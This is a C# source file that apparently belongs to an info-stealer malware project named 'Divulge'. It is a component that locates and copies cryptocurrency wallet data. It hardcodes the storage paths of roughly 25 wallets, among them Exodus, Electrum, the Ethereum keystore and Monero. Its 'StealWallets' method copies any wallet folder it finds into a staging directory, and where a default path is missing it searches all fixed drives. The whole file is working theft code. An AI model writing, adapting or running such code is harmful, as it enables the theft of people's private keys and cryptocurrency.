using Divulge.payload.Components.Utilities;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Threading.Tasks;
using System.Threading;

namespace Divulge.payload.Components.Crypto
{
    internal static class WS
    {
        private static Dictionary<string, string> _walletPaths;
        private static readonly string[] ExcludedFolders = { "Windows", "Program Files", "Program Files (x86)", "ProgramData", "AppData" };
        private const int MaxDepth = 3; // Limit search depth

        static WS()
        {
            var appdata = Environment.GetEnvironmentVariable("APPDATA");
            var localappdata = Environment.GetEnvironmentVariable("LOCALAPPDATA");

            _walletPaths = new Dictionary<string, string>()
            {
                { "Zcash", Path.Combine(appdata, "Zcash") },
                { "Armory", Path.Combine(appdata, "Armory") },
                { "Bytecoin", Path.Combine(appdata, "Bytecoin") },
                { "Jaxx", Path.Combine(appdata, "com.liberty.jaxx", "IndexedDB", "file_0.indexeddb.leveldb") },
                { "Exodus", Path.Combine(appdata, "Exodus", "exodus.wallet") },
                { "Ethereum", Path.Combine(appdata, "Ethereum", "keystore") },
                { "Electrum", Path.Combine(appdata, "Electrum", "wallets") },
                { "AtomicWallet", Path.Combine(appdata, "atomic", "Local Storage", "leveldb") },
                { "Guarda", Path.Combine(appdata, "Guarda", "Local Storage", "leveldb") },
                { "Coinomi", Path.Combine(localappdata, "Coinomi", "Coinomi", "wallets") },
                { "Bitcoin", Path.Combine(appdata, "Bitcoin", "wallets") },
                { "Litecoin", Path.Combine(appdata, "Litecoin", "wallets") },
                { "Dash", Path.Combine(appdata, "Dash", "wallets") },
                { "Dogecoin", Path.Combine(appdata, "Dogecoin", "wallets") },
                { "Monero", Path.Combine(appdata, "monero-project", "monero-core") },
                { "Ripple", Path.Combine(appdata, "Ripple", "wallets") },
                { "Stellar", Path.Combine(appdata, "Stellar", "wallets") },
                { "Binance", Path.Combine(appdata, "Binance", "wallets") },
                { "Tron", Path.Combine(appdata, "Tron", "wallets") },
                { "VeChain", Path.Combine(appdata, "VeChain", "wallets") },
                { "Polkadot", Path.Combine(appdata, "Polkadot", "wallets") },
                { "Cardano", Path.Combine(appdata, "Cardano", "wallets") },
                { "Tezos", Path.Combine(appdata, "Tezos", "wallets") },
                { "Zilliqa", Path.Combine(appdata, "Zilliqa", "wallets") },
                { "Neo", Path.Combine(appdata, "Neo", "wallets") }
            };
        }

        internal static async Task<int> StealWallets(string dst, CancellationToken cancellationToken = default)
        {
            var count = 0;

            foreach (var item in _walletPaths)
            {
                var walletPath = await FindWalletPath(item.Key, item.Value, cancellationToken);

                if (walletPath != null && Directory.Exists(walletPath))
                {
                    var saveToDir = Path.Combine(dst, item.Key);
                    DirectoryInfo outDir = null;

                    try
                    {
                        outDir = Directory.CreateDirectory(saveToDir);
                        Common.CopyTree(walletPath, saveToDir);

                        using (FileStream fs = new FileStream(Path.Combine(saveToDir, "Source.txt"), FileMode.Create, FileAccess.Write, FileShare.Read))
                        using (StreamWriter writer = new StreamWriter(fs))
                        {
                            await writer.WriteAsync($"Source: {walletPath}");
                        }

                        count++;
                    }
                    catch (Exception ex)
                    {
                        try
                        {
                            outDir?.Delete(true);
                        }
                        catch { }

                        Console.WriteLine(ex);
                    }
                }
            }

            return count;
        }

        private static async Task<string> FindWalletPath(string walletName, string defaultPath, CancellationToken cancellationToken)
        {
            // Check default path first
            if (Directory.Exists(defaultPath))
            {
                return defaultPath;
            }

            // Parallel search on fixed drives with limited depth and cancellation token
            var tasks = DriveInfo.GetDrives()
                .Where(d => d.DriveType == DriveType.Fixed)
                .Select(d => Task.Run(() => SearchDirectoryForWallet(d.RootDirectory.FullName, walletName, MaxDepth, cancellationToken), cancellationToken))
                .ToList();

            var results = await Task.WhenAll(tasks);

            return results.FirstOrDefault(r => r != null);
        }

        private static string SearchDirectoryForWallet(string rootDirectory, string walletFolderOrFile, int depth, CancellationToken cancellationToken)
        {
            if (depth == 0 || cancellationToken.IsCancellationRequested)
                return null;

            try
            {
                foreach (var directory in Directory.EnumerateDirectories(rootDirectory))
                {
                    if (IsExcluded(directory))
                        continue;

                    var walletPath = Path.Combine(directory, walletFolderOrFile);
                    if (Directory.Exists(walletPath) || File.Exists(walletPath))
                    {
                        return walletPath;
                    }

                    // Recursively search subdirectories with depth limit
                    string foundPath = SearchDirectoryForWallet(directory, walletFolderOrFile, depth - 1, cancellationToken);
                    if (foundPath != null)
                    {
                        return foundPath;
                    }
                }
            }
            catch (UnauthorizedAccessException)
            {
                // Skip directories where access is denied
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error searching in {rootDirectory}: {ex.Message}");
            }

            return null;
        }

        private static bool IsExcluded(string directory)
        {
            foreach (var folder in ExcludedFolders)
            {
                if (directory.IndexOf(folder, StringComparison.OrdinalIgnoreCase) >= 0)
                {
                    return true;
                }
            }
            return false;
        }
    }
}
